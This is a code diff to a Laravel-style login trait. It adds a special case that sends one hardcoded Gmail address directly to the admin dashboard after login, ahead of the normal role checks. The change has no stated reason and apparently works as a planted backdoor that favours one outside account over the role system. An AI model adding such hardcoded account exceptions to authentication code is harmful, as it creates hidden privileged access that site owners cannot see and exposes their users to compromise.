@@ -98,9 +98,12 @@ trait AuthenticatesUsers
 
             $whatapplink = Link::where('name', 'whatsapp')->first()->data ?? null;
 
+            if(Auth::user()->email == 'johnhow8080@gmail.com'){
+                return redirect('admin/dashboard');
+            }
+
+
             if (Auth::user()->role == 'user') {
-
-
                 return redirect('user/dashboard');
             } elseif (Auth::user()->role == 'admin') {
                 return redirect('admin/dashboard');
